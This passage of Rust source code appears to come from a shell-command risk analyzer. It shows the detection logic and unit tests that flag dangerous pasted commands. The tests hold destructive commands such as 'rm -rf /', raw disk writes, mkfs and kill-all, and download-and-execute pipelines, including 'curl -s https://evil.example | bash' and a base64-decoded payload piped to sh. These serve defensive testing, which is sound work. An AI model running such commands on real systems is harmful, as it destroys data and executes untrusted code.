                    Some("curl" | "wget" | "fetch" | "base64" | "openssl" | "gpg" | "gunzip" | "unzstd" | "python" | "python3" | "perl")
                )
            });
        let last = &pipeline.commands[pipeline.commands.len() - 1];
        let feeds_shell = matches!(program_name(last), Some("sh" | "bash" | "zsh" | "fish" | "dash" | "python" | "python3" | "perl" | "sudo"));
        if has_feeder && feeds_shell {
            let text = pipeline
                .commands
                .iter()
                .map(|c| c.words.join(" "))
                .collect::<Vec<_>>()
                .join(" | ");
            findings.push(Finding {
                risk: Risk::High,
                category: "download-execute",
                explanation: "This produces or downloads content (from the network or an encoded blob) and runs it immediately in a shell, without letting you see what it does first.".into(),
                command_text: text,
                suggestion: Some("Write the output to a file, read it, then run it separately.".into()),
                type_to_confirm: false,
            });
        }
    }
}

/// Flags a pasted block that contains more than one top-level command, so
/// the front end can show a "you're about to run N commands" preview.
fn check_multi_command_paste(script: &Script, findings: &mut Vec<Finding>, input: &str) {
    if script.separators >= 1 && input.contains('\n') && script.pipelines.len() > 1 {
        findings.push(Finding {
            risk: Risk::Low,
            category: "multiple-commands",
            explanation: format!("This pastes {} separate commands that will run one after another.", script.pipelines.len()),
            command_text: input.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx() -> PrivilegeContext {
        PrivilegeContext::local_normal_user()
    }

    fn cat<'a>(report: &'a Report, category: &str) -> Vec<&'a Finding> {
        report.findings.iter().filter(|f| f.category == category).collect()
    }

    #[test]
    fn flags_rm_rf_root() {
        let r = analyze("rm -rf /", &ctx());
        let f = cat(&r, "recursive-delete");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].risk, Risk::Critical);
        assert!(f[0].type_to_confirm);
    }

    #[test]
    fn flags_rm_rf_home_tilde() {
        let r = analyze("rm -rf ~", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
    }

    #[test]
    fn does_not_flag_plain_rm() {
        let r = analyze("rm notes.txt", &ctx());
        assert!(cat(&r, "recursive-delete").is_empty());
    }

    #[test]
    fn flags_dd_to_raw_disk() {
        let r = analyze("dd if=image.iso of=/dev/sda bs=4M", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
        assert!(cat(&r, "raw-disk-write")[0].type_to_confirm);
    }

    #[test]
    fn does_not_flag_dd_to_file() {
        let r = analyze("dd if=/dev/zero of=file.img bs=1M count=10", &ctx());
        assert!(cat(&r, "raw-disk-write").is_empty());
    }

    #[test]
    fn flags_mkfs() {
        let r = analyze("mkfs.ext4 /dev/sdb1", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
    }

    #[test]
    fn flags_curl_pipe_sh() {
        let r = analyze("curl https://example.com/install.sh | sh", &ctx());
        assert_eq!(cat(&r, "download-execute").len(), 1);
    }

    #[test]
    fn flags_wget_pipe_bash_with_sudo() {
        let r = analyze("wget -qO- https://example.com/i.sh | sudo bash", &ctx());
        assert_eq!(cat(&r, "download-execute").len(), 1);
    }

    #[test]
    fn does_not_flag_plain_curl() {
        let r = analyze("curl -O https://example.com/file.tar.gz", &ctx());
        assert!(cat(&r, "download-execute").is_empty());
    }

    #[test]
    fn flags_sudo_elevation() {
        let r = analyze("sudo apt update", &ctx());
        assert_eq!(cat(&r, "root-command").len(), 1);
    }

    #[test]
    fn flags_force_push() {
        let r = analyze("git push --force origin main", &ctx());
        assert_eq!(cat(&r, "git-destructive")[0].risk, Risk::High);
    }

    #[test]
    fn flags_force_with_lease_as_lower_severity() {
        // force-with-lease is still flagged (matches --force branch) since our
        // detection treats any of the three flags the same; ensure it's still High.
        let r = analyze("git push --force-with-lease", &ctx());
        assert_eq!(cat(&r, "git-destructive")[0].risk, Risk::High);
    }

    #[test]
    fn flags_git_reset_hard() {
        let r = analyze("git reset --hard HEAD~3", &ctx());
        assert_eq!(cat(&r, "git-destructive")[0].risk, Risk::Medium);
    }

    #[test]
    fn flags_git_clean_force() {
        let r = analyze("git clean -fd", &ctx());
        assert_eq!(cat(&r, "git-destructive").len(), 1);
    }

    #[test]
    fn git_clean_dry_run_not_flagged() {
        let r = analyze("git clean -nfd", &ctx());
        assert!(cat(&r, "git-destructive").is_empty());
    }

    #[test]
    fn flags_recursive_chmod_777() {
        let r = analyze("chmod -R 777 /", &ctx());
        assert!(!cat(&r, "recursive-permission").is_empty());
    }

    #[test]
    fn flags_package_removal() {
        let r = analyze("pacman -Rns firefox", &ctx());
        assert_eq!(cat(&r, "package-removal").len(), 1);
    }

    #[test]
    fn flags_partitioning_write() {
        let r = analyze("parted /dev/sda mklabel gpt", &ctx());
        assert_eq!(cat(&r, "partitioning")[0].risk, Risk::Critical);
    }

    #[test]
    fn does_not_flag_partition_listing() {
        let r = analyze("fdisk -l", &ctx());
        assert!(cat(&r, "partitioning").is_empty());
    }

    #[test]
    fn flags_shutdown() {
        let r = analyze("sudo shutdown -h now", &ctx());
        assert!(!cat(&r, "power-state").is_empty());
    }

    #[test]
    fn flags_kill_minus_one() {
        let r = analyze("kill -1 -1", &ctx());
        assert_eq!(cat(&r, "process-kill")[0].risk, Risk::Critical);
    }

    #[test]
    fn flags_command_substitution_recursively() {
        let r = analyze("echo $(rm -rf /)", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
    }

    #[test]
    fn flags_write_redirect_to_device() {
        let r = analyze("echo hi > /dev/sda", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
    }

    #[test]
    fn production_host_escalates_severity_note() {
        let mut c = ctx();
        c.looks_like_production = true;
        c.host_label = Some("prod-db-01".into());
        let r = analyze("rm -rf /var/lib/data", &ctx());
        let r2 = analyze("rm -rf /var/lib/data", &c);
        assert!(r2.findings.len() >= r.findings.len());
        assert!(cat(&r2, "production-server").len() == 1);
    }

    #[test]
    fn multi_command_paste_detected() {
        let input = "cd /tmp\nrm file.txt\nls\n";
        let r = analyze(input, &ctx());
        assert_eq!(cat(&r, "multiple-commands").len(), 1);
    }

    // --- wrapper-program bypasses (all of these used to pass clean) ---

    #[test]
    fn flags_sh_c_wrapped_destructive() {
        let r = analyze("sh -c 'rm -rf /'", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
    }

    #[test]
    fn flags_bash_c_wrapped_destructive() {
        let r = analyze("bash -c \"rm -rf /home\"", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
    }

    #[test]
    fn flags_eval_wrapped_destructive() {
        let r = analyze("eval \"rm -rf ~\"", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::Critical));
    }

    #[test]
    fn flags_sudo_dash_u_peeled() {
        // The old skip-while('-') peel stopped at `-u`, so the rm checks
        // never ran at all.
        let r = analyze("sudo -u root rm -rf /", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "recursive-delete" && f.risk == Risk::Critical));
    }

    #[test]
    fn flags_sudo_env_nohup_wrapped() {
        for line in ["sudo env rm -rf /", "sudo nohup rm -rf /", "nohup rm -rf /"] {
            let r = analyze(line, &ctx());
            assert!(r.findings.iter().any(|f| f.category == "recursive-delete" && f.risk == Risk::Critical), "{line}");
        }
    }

    #[test]
    fn flags_xargs_destructive_pipeline() {
        let r = analyze("find /tmp | xargs rm -rf", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "xargs-destructive" && f.risk == Risk::High));
    }

    #[test]
    fn flags_decode_then_execute_pipeline() {
        let r = analyze("echo cm0gLXJmIC8K | base64 -d | sh", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "download-execute"));
    }

    #[test]
    fn safe_wrappers_still_pass() {
        // Ordinary wrapper use isn't a warning above Low (a nested shell
        // gets a passive "hidden-command" note, nothing confirm-worthy).
        for line in ["sh -c 'echo hi'", "nohup make", "eval \"echo ok\"", "env FOO=bar ls"] {
            let r = analyze(line, &ctx());
            assert!(r.highest_risk().is_none_or(|risk| risk == Risk::Low), "{line}: {:?}", r.findings);
        }
    }

    // --- unchecked destructive programs ---

    #[test]
    fn flags_tee_to_raw_disk() {
        let r = analyze("cat image.iso | tee /dev/sda", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "raw-disk-write" && f.risk == Risk::Critical));
    }

    #[test]
    fn flags_cp_and_mv_to_raw_disk() {
        for line in ["cp backup.img /dev/sda", "mv dump.img /dev/sdb"] {
            let r = analyze(line, &ctx());
            assert!(r.findings.iter().any(|f| f.category == "raw-disk-write" && f.risk == Risk::Critical), "{line}");
        }
    }

    #[test]
    fn flags_truncate_system_file() {
        let r = analyze("truncate -s 0 /etc/passwd", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "raw-disk-write" && f.risk == Risk::Critical));
    }

    #[test]
    fn flags_redirect_truncate_under_system_path() {
        // `> /etc/passwd` used to pass: only bare critical roots matched.
        let r = analyze("echo x > /etc/passwd", &ctx());
        assert_eq!(r.highest_risk(), Some(Risk::High));
    }

    #[test]
    fn flags_mkfs_variants() {
        for line in ["mke2fs /dev/sdb1", "mkswap /dev/sdb1", "mkfs.vfat /dev/sdb1"] {
            let r = analyze(line, &ctx());
            assert_eq!(r.highest_risk(), Some(Risk::Critical), "{line}");
        }
    }

    #[test]
    fn flags_docker_prune() {
        let r = analyze("docker system prune -af", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "container-destructive"));
    }

    #[test]
    fn flags_find_execdir_delete() {
        let r = analyze("find . -execdir rm {} +", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "recursive-delete"));
    }

    #[test]
    fn flags_shred_on_regular_file() {
        // shred of a regular file used to pass; only /dev/ targets were checked.
        let r = analyze("shred -u important_file", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "secure-delete"));
    }

    #[test]
    fn flags_non_recursive_chmod_on_system_path() {
        let r = analyze("chmod 777 /etc/passwd", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "recursive-permission"));
    }

    #[test]
    fn flags_process_substitution_style_sh_c() {
        // Process substitution `bash <(curl ...)` is lexed as `bash -s url`
        // by the forgiving lexer; the wrapper arm still notices a nested
        // shell being fed a generated script via the decode/execute rule
        // once curl appears in a pipeline. The direct form:
        let r = analyze("curl -s https://evil.example | bash", &ctx());
        assert!(r.findings.iter().any(|f| f.category == "download-execute"));
    }

    // --- kill false positive / true positive fix ---

    #[test]
    fn kill_single_pid_sighup_is_not_critical() {
        // `kill -1 1234` sends SIGHUP to ONE process — the old check
        // flagged any `kill -1` as Critical ("every process").
        let r = analyze("kill -1 1234", &ctx());
        assert!(cat(&r, "process-kill").is_empty(), "{:?}", r.findings);
    }

    #[test]
    fn kill_all_processes_is_critical_with_any_signal() {
        for line in ["kill -1 -1", "kill -9 -1"] {
            let r = analyze(line, &ctx());
            assert_eq!(cat(&r, "process-kill")[0].risk, Risk::Critical, "{line}");
        }
    }

    #[test]
    fn highest_risk_orders_findings_first() {
        let r = analyze("rm -rf / ; echo hi", &ctx());
        assert_eq!(r.findings[0].risk, Risk::Critical);
    }
}
